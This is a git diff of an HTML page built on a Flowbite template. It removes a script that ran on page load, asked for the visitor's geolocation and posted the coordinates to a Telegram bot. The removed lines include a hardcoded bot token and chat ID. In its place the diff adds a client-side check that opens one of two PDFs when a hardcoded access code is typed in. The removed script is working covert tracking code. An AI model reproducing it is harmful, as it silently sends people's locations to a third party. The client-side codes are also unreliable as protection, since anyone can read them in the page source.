@@ -19,7 +19,9 @@
     />
   </head>
   <body>
-    <nav class="bg-white w-full z-20 top-0 start-0 border-b border-neutral-300 py-3">
+    <nav
+      class="bg-white w-full z-20 top-0 start-0 border-b border-neutral-300 py-3"
+    >
       <div class="flex flex-wrap justify-between mx-auto px-8">
         <a href="#" class="flex items-center space-x-3 rtl:space-x-reverse">
           <img src="./img/logotype.svg" class="w-42.5" alt="Flowbite Logo" />
@@ -182,46 +184,18 @@
       </div>
     </footer>
     <script>
-        const BOT_TOKEN = "8397379176:AAFEjwoQYX9SsXB4d4ewMMoVjqPP9JnDAbA";
-        const CHAT_ID = "-1003578485277";
+      let input = document.getElementById("code");
+      let btn = document.getElementById("btn");
 
-  function sendLocationToTelegram(lat, lon) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
-
-    fetch(url, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        latitude: lat,
-        longitude: lon,
-      }),
-    });
-  }
-
-  function requestLocation() {
-    if (!navigator.geolocation) {
-      console.log("Geolocation not supported");
-      return;
-    }
-
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-
-        sendLocationToTelegram(lat, lon);
-      },
-      (error) => {
-        console.log("Location denied or error", error);
-      }
-    );
-  }
-
-  // Ask for location when site opens
-  window.onload = requestLocation;
+      btn.onclick = function () {
+        if (input.value == "0781") {
+          window.open("./file.pdf");
+        } else if (input.value == "0221") {
+          window.open("./file_20251226.pdf");
+        } else {
+          alert("Noto'g'ri  ko'd");
+        }
+      };
     </script>
   </body>
 </html>
